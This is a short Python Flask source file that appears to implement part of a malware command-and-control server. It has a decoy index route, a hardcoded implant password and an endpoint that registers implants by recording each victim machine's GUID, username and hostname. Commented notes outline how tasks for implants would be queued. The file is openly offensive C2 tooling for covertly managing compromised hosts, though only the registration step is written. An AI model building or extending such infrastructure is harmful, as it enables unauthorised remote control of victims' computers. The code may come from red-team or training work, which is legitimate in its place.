from crypt import methods
from flask import Blueprint, jsonify, request
from speedrun.db import db
from speedrun.parser import RegisterData
from speedrun.models import make_implant
import struct

password = struct.pack("<16s", b"1337ch0nkyboy").hex()

c2 = Blueprint('c2', __name__)


# Notes:

# add to session
#db.session.add(implant)
#db.session.commit()

# Find all tasks in a list
# Task.query.filter(Task.task_id.in_(ids)).all()

# Get all 
# Task.query.filter_by(implant_id = cd.Guid, status=CREATED ).first()

# query first 
# get data
# request.data

@c2.route("/index.html")
def hello_c2():
    return "Nothing to see here"


# add register, task 

@c2.route("/implant/register", methods=["POST"])
def handle_register():
    data = request.data
    rd = RegisterData()
    try:
        rd.unpack(data)
        if rd.Password !=password:
            return  ":("
        implant = make_implant(rd.Guid, rd.szUsername, rd.szHostname)
        db.session.add(implant)
        db.session.commit()
        print("Successfully registered a new implant: ", implant.implant_id )
        return "ok"
    except Exception as e:
        print("Failed to register implant", Exception, e)
        return ":("

   
